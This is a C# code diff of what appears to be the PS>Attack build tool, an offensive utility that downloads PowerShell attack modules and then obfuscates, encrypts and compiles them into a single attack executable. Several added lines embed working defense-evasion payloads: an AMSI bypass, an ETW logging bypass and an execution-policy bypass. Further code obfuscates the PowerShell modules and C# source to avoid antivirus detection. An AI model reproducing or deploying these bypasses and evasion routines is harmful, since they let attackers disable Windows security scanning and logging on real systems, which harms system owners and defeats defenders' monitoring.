@@ -7,6 +7,9 @@ using System.Runtime.Serialization.Json;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Timers;
+using System.Management.Automation;
+using System.Configuration;
+
 using PSAttackBuildTool.Modules;
 using PSAttackBuildTool.Utils;
 using PSAttackBuildTool.PSAttack;
@@ -25,30 +28,23 @@ namespace PSAttackBuildTool
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine(Strings.psaWarningMsg);
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.WriteLine("\n Press any key to start the build process..");
+            Console.WriteLine("\n Press any enter key to start the build process..");
             Console.ReadLine();
             Console.Clear();
 
-            //PRINT LOGO
-            //Console.ForegroundColor = ConsoleColor.DarkYellow;
-            //Random random = new Random();
-            //int psaLogoInt = random.Next(Strings.psabtLogos.Count);
-            //Console.WriteLine(Strings.psabtLogos[psaLogoInt]);
-            //Console.WriteLine("Version {0}\n", Strings.version);
-            //Console.ForegroundColor = ConsoleColor.White;
-
-            Display display = new Display();
-            GeneratedStrings generatedStrings = new GeneratedStrings();
+            // DISPLAY DASHBOARD
+            Display.Dashboard();
+            GeneratedStrings keyStoreStrings = new GeneratedStrings();
             Random random = new Random();
 
             // DELETE BUILD DIR
-            display.updateStage("Initializing..");
-            display.updateStatus("Clearing Build Dir: " + PSABTUtils.GetPSAttackBuildToolDir());
+            Display.Stage("Initializing..");
+            Display.Status("Clearing Build Dir: " + PSABTUtils.GetPSAttackBuildToolDir());
             Directory.Delete(PSABTUtils.GetPSAttackBuildToolDir(), true);
 
             //READ JSON FILE
-            display.updateStage("Initializing..");
-            display.updateStatus("Loading modules.json");
+            Display.Stage("Initializing..");
+            Display.Status("Loading modules.json");
             StreamReader sr = new StreamReader("modules.json");
             string modulesJson = sr.ReadToEnd();
             MemoryStream memReader = new MemoryStream(Encoding.UTF8.GetBytes(modulesJson));
@@ -56,136 +52,155 @@ namespace PSAttackBuildTool
             string workingDir = PSABTUtils.GetPSAttackBuildToolDir();
 
             //GET PS>ATTACK 
-            display.updateStage("Getting PS>Attack");
-            display.updateStatus("Searching Github");
-            Attack attack = PSABTUtils.GetPSAttack(new Uri(Strings.attackURL));
-            display.updateStatus("Found Version: " + attack.tag_name);
-            display.updateMessage("Downloading " + attack.zipball_url);
+            Display.Stage("Getting PS>Attack");
+            Display.Status("Searching Github");
+            Attack attack = PSABTUtils.GetPSAttack();
+            Display.Status("Found Version: " + attack.tag_name);
+            Display.PrimaryMessage("Downloading " + attack.zipball_url);
             attack.DownloadZip();
-            display.updateMessage("Unzipping to: " + Strings.attackUnzipDir);
-            attack.unzipped_dir = PSABTUtils.UnzipFile(Strings.attackZipPath);
+            Display.PrimaryMessage("Unzipping to: " + Strings.attackUnzipDir);
+            attack.unzipped_dir = PSABTUtils.UnzipFile(Strings.attackZipPath, Strings.attackUnzipDir);
 
             // PROCESS PS>ATTACK
-            display.updateStage("Preparing PS>Attack Build");
+            Display.Stage("Preparing PS>Attack Build");
 
             // CLEAR OUT BUNDLED MODULES
-            display.updateStatus("Clearing modules at: " + attack.modules_dir);
-            display.updateMessage("");
+            Display.Status("Clearing modules at: " + attack.modules_dir);
+            Display.PrimaryMessage("");
             attack.ClearModules();
 
             // CREATE DIRECTORY STRUCTURE
-            
+
             if (!(Directory.Exists(Strings.moduleSrcDir)))
             {
-                display.updateStatus("Creating Modules Source Directory: " + Strings.moduleSrcDir);
+                Display.Status("Creating Modules Source Directory: " + Strings.moduleSrcDir);
                 Directory.CreateDirectory(Strings.moduleSrcDir);
             }
 
             if (!(Directory.Exists(Strings.obfuscatedScriptsDir)))
             {
-                display.updateStatus("Creating Obfuscated Modules Directory: " + Strings.obfuscatedScriptsDir);
+                Display.Status("Creating Obfuscated Modules Directory: " + Strings.obfuscatedScriptsDir);
                 Directory.CreateDirectory(Strings.obfuscatedScriptsDir);
             }
 
             if (!(Directory.Exists(Strings.obfuscatedSourceDir)))
             {
-                display.updateStatus("Creating Obfuscated Source Directory: " + Strings.obfuscatedSourceDir);
+                Display.Status("Creating Obfuscated Source Directory: " + Strings.obfuscatedSourceDir);
                 Directory.CreateDirectory(Strings.obfuscatedSourceDir);
+            }
+
+            if (!(Directory.Exists(Strings.invokeObfuscationDir)))
+            {
+                Display.Status("Creating Obfuscated Source Directory: " + Strings.invokeObfuscationDir);
+                Directory.CreateDirectory(Strings.invokeObfuscationDir);
             }
 
             // CLEAR OUT OBFUSCATED SCRIPTS DIR
             DirectoryInfo dirInfo = new DirectoryInfo(Strings.obfuscatedScriptsDir);
             foreach (FileInfo file in dirInfo.GetFiles())
             {
-                display.updateStatus("Clearing Obfuscated Modules Directory");
-                display.updateMessage("Deleting: " + file.Name);
+                Display.Status("Clearing Obfuscated Modules Directory");
+                Display.PrimaryMessage("Deleting: " + file.Name);
                 file.Delete();
             }
 
+            // DOWNLOAD @DANIELBOHANNON's INVOKE-OBFUSCATION
+            if (ConfigurationManager.AppSettings["obfuscatePowerShell"] == "true")
+            {
+                ObfuscationEngine.Posh.DownloadInvokeObfuscation();
+            }
+
             // MAKE NEW MODULES
-            display.updateStage("Processing Modules");
-            display.updateStatus("");
-            display.updateMessage("");
+            Display.Stage("Processing Modules");
+            Display.Status("");
+            Display.PrimaryMessage("");
             foreach (Module module in modules)
             {
                 string dest = Path.Combine(Strings.moduleSrcDir, (module.name + ".ps1"));
-                string encOutfile = attack.modules_dir + CryptoUtils.EncryptString(attack, module.name, generatedStrings);
+                string encOutfile = attack.modules_dir + CryptoUtils.EncryptString(attack, module.name, keyStoreStrings);
                 try
                 {
-                    display.updateStatus("Processing " + module.name);
-                    display.updateMessage("Downloading from " + module.url);
+                    Display.Status($"Processing {module.name}");
+                    Display.PrimaryMessage($"Downloading from {module.url}");
                     PSABTUtils.DownloadFile(module.url, dest);
-                    display.updateMessage("Encrypting " + module.name);
-                    CryptoUtils.EncryptFile(attack, dest, encOutfile, generatedStrings);
+                    
+                    if (ConfigurationManager.AppSettings["obfuscatePowerShell"] == "true")
+                    {
+                        Display.PrimaryMessage($"Obfuscating {module.name} (This might take a minute or three, literally)");
+                        dest = ObfuscationEngine.Posh.InvokeObfuscation(dest, true);
+                    }
+
+                    Display.PrimaryMessage($"Encrypting {module.name}");
+                    if (Path.GetFileName(dest) != "ERROR")
+                    {
+                        CryptoUtils.EncryptFile(attack, dest, encOutfile, keyStoreStrings);
+                    }
                 }
                 catch (Exception e)
                 {
-                    ConsoleColor origColor = Console.ForegroundColor;
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    display.updateStatus("ERROR!!");
-                    display.updateMessage("There was an error processing " + module.name + " This will probably break the build.");
-                    display.updateSecondaryMessage("Error message: " + e.Message + "\n\n Press enter to continue building PS>Attack..");
-                    Console.ReadLine();
-                    Console.ForegroundColor = origColor;
-
+                    Display.ErrorMessage($"There was an error processing {module.name}.", e.Message);
                 }
             }
 
             // PLACE MATTS AMSI BYPASS IN KEYSTORE
-            generatedStrings.Store.Add("amsiBypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
-            generatedStrings.Store.Add("setExecutionPolicy", "Set-ExecutionPolicy Bypass -Scope Process -Force");
-            generatedStrings.Store.Add("buildDate", DateTime.Now.ToString());
+            if (ConfigurationManager.AppSettings["obfuscatePowerShell"] == "true")
+            {
+                keyStoreStrings.Store.Add("amsiBypass", ObfuscationEngine.Posh.InvokeObfuscation("{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}"));
+            }
+            else
+            {
+                keyStoreStrings.Store.Add("amsiBypass", "[psobject].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
+            }
+
+            // PLACE ETW BYPASS IN KEYSTORE (Source: https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32)
+            keyStoreStrings.Store.Add("etwBypass", ObfuscationEngine.Posh.InvokeObfuscation("{[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)}"));
+
+            keyStoreStrings.Store.Add("setExecutionPolicy", "{Set -ExecutionPolicy Bypass -Scope Process -Force}");
+            keyStoreStrings.Store.Add("buildDate", DateTime.Now.ToString());
 
             // WRITE KEYS TO CSV
             DataContractJsonSerializer jsonSerializer = new DataContractJsonSerializer(typeof(Dictionary<string, string>));
-            string keyStoreFileName = PSABTUtils.RandomString(64, new Random());
-            generatedStrings.Store.Add("keyStoreFileName", keyStoreFileName);
+            keyStoreStrings.AddValue("keyStoreFileName");
             using (StreamWriter keystoreCSV = new StreamWriter(Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv")))
             {
-                foreach (KeyValuePair<string, string> entry in generatedStrings.Store)
+                foreach (KeyValuePair<string, string> entry in keyStoreStrings.Store)
                 {
                     keystoreCSV.WriteLine("{0}|{1}", entry.Key, entry.Value);
                 }
             }
 
             // Encrypt keystore
-            CryptoUtils.EncryptFile(attack, Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv"), Path.Combine(attack.resources_dir, keyStoreFileName), generatedStrings);
+            CryptoUtils.EncryptFile(attack, Path.Combine(PSABTUtils.GetPSAttackBuildToolDir(), "keystore.csv"), Path.Combine(attack.resources_dir, keyStoreStrings.Store["keyStoreFileName"]), keyStoreStrings);
 
 
             // GENERATE CSPROJ FILE
-            display.updateStage("Building PS>Attack");
-            display.updateStatus("Generating PSAttack.csproj at " + attack.csproj_file);
-            display.updateMessage("");
-            PSABTUtils.BuildCsproj(modules, attack, generatedStrings);
+            Display.Stage("Building PS>Attack");
+            Display.Status("Generating PSAttack.csproj at " + attack.csproj_file);
+            Display.PrimaryMessage("");
+            PSABTUtils.BuildCsproj(modules, attack, keyStoreStrings);
 
             // GENERATE SETTINGS FILE
-            display.updateStage("Building PS>Attack");
-            display.updateStatus("Generating Config File at " + attack.config_file);
-            display.updateMessage("");
-            PSABTUtils.BuildConfigFile(attack, generatedStrings);
-
-            // GENERATE SETTINGS DESIGNER FILE
-            //display.updateStage("Building PS>Attack");
-            //display.updateStatus("Generating Settings Designer File at " + attack.config_file);
-            //display.updateMessage("");
-            //PSABTUtils.BuildSettingsDesignerFile(attack, generatedStrings);
+            Display.Stage("Building PS>Attack");
+            Display.Status("Generating Config File at " + attack.config_file);
+            Display.PrimaryMessage("");
+            PSABTUtils.BuildConfigFile(attack, keyStoreStrings);
 
             // OBFUSCATE
-            ObfuscationEngine.ObfuscationEngine engine = new ObfuscationEngine.ObfuscationEngine(generatedStrings);
             string[] files = Directory.GetFiles(Strings.attackUnzipDir, "*.*", SearchOption.AllDirectories);
+            GeneratedStrings rulesStrings = ObfuscationEngine.CSharp.CreateRules();
             foreach (string file in files)
             {
-                engine.ProcessSource(display, file, generatedStrings, attack);
+                ObfuscationEngine.CSharp.ProcessSource(file, rulesStrings, keyStoreStrings, attack);
             }
             
             // BUILD PS>ATTACK
             Timer timer = new Timer(1200);
-            display.updateStatus("Kicking off build");
-            display.updateMessage("3..");
-            display.updateMessage("3.. 2..");
-            display.updateMessage("3.. 2.. 1..\n\n\n");
+            Display.Status("Kicking off build");
+            Display.PrimaryMessage("3..");
+            Display.PrimaryMessage("3.. 2..");
+            Display.PrimaryMessage("3.. 2.. 1..\n\n\n");
             Console.ForegroundColor = ConsoleColor.Gray;
-            int exitCode = PSABTUtils.BuildPSAttack(attack, generatedStrings);
+            int exitCode = PSABTUtils.BuildPSAttack(attack, rulesStrings);
             if (exitCode == 0)
             {
                 Console.ForegroundColor = ConsoleColor.Green;
